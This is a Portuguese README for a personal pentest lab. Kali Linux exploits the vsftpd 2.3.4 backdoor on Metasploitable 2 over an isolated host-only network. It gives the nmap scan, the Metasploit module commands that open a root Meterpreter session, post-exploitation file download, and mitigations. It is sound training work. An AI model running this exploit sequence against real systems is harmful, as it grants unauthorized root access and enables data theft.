# Lab de Pentest: Kali Linux + Metasploitable 2

Projeto pessoal de estudo prático em segurança ofensiva, explorando uma vulnerabilidade real e catalogada usando um ambiente isolado e controlado.

## Objetivo

Montar um ambiente de laboratório com duas máquinas virtuais — uma atacante (Kali Linux) e uma alvo intencionalmente vulnerável (Metasploitable 2) — para praticar reconhecimento de rede, exploração de falhas conhecidas e pós-exploração, entendendo cada etapa do processo.

## Ambiente

- **Hipervisor:** VirtualBox
- **Máquina atacante:** Kali Linux
- **Máquina alvo:** Metasploitable 2 (Ubuntu 8.04, distribuída de propósito com falhas conhecidas para fins educacionais)
- **Rede:** Host-only isolada (`192.168.56.0/24`) — sem acesso à internet ou à rede local real, garantindo que o ambiente vulnerável nunca fique exposto

## Etapas realizadas

### 1. Configuração do ambiente
- Criação das duas VMs no VirtualBox
- Configuração de rede host-only para isolar o laboratório
- Confirmação de conectividade entre as VMs

![IF CONFIG](images_project/01-ifconfig.png)

### 2. Reconhecimento
```bash
nmap -sV 192.168.56.101
```
Escaneamento de portas com detecção de versão, revelando múltiplos serviços desatualizados, incluindo **vsftpd 2.3.4** rodando na porta 21.

![NMAP -sV](images_project/01-kali-ip.png)

### 3. Exploração da vulnerabilidade
O `vsftpd 2.3.4` é uma versão do servidor FTP que teve seu código-fonte comprometido em 2011: um invasor inseriu um backdoor que, ao receber um usuário contendo o caractere `:)`, abre um shell de root na porta 6200.

Utilizando o Metasploit Framework:
```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
run
```
Resultado: sessão Meterpreter aberta com acesso root completo à máquina alvo, sem uso de nenhuma credencial válida.

### 4. Pós-exploração
Com a sessão ativa, foram exploradas as capacidades de reconhecimento e manipulação de arquivos:
```bash
sysinfo
getuid
ps
ls / 
download <arquivo>
```

### 5. Testes complementares no protocolo FTP
Além da exploração do backdoor, foram testados fluxos de uso legítimo do FTP (criação e transferência de arquivos com `put`/`get`) e um cenário simulado de exfiltração de dados: um arquivo criado diretamente na máquina alvo foi baixado através da sessão obtida via exploit, sem nenhuma credencial — demonstrando o impacto real de manter serviços desatualizados expostos.

### 6. Mitigação
Como exercício complementar, foram avaliadas estratégias de mitigação para esse tipo de falha:
- Atualização do serviço vulnerável
- Desativação do serviço não utilizado
- Bloqueio de porta via firewall (`iptables`)
- Segmentação de rede (já aplicada na configuração host-only do próprio laboratório)

## 💡 Principais aprendizados

- Diferença entre varredura simples de portas e detecção de versão (`-sV`)
- Fluxo de uso do Metasploit Framework: `search` → `use` → `set` → `run`
- Conceito de payload reverso e a diferença entre `RHOSTS` (alvo) e `LHOST` (atacante)
- Como uma única falha em um serviço desatualizado pode comprometer totalmente um sistema
- Importância de segmentação de rede e atualização de software como camadas de defesa

## ⚠️ Aviso

Este laboratório foi montado e executado inteiramente em um ambiente isolado e local, sem qualquer exposição a redes externas ou de terceiros. O Metasploitable 2 é uma distribuição oficial da Rapid7, criada especificamente para fins educacionais de segurança ofensiva. Técnicas aqui aplicadas não devem ser utilizadas contra sistemas sem autorização explícita.
